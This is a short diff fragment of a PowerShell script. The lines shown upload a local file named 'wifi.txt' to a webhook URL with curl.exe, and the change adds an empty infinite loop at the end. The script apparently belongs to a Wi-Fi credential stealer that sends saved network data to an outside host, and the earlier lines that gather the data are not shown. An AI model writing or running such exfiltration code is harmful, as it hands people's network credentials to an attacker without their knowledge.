@@ -42,3 +42,5 @@ Write-Output "Hit3"
 $file = Join-Path -Path $PWD -ChildPath "wifi.txt"
 curl.exe -F "file1=@$file" $webhookURL
 Write-Output "Hit4"
+for(;;){
+}
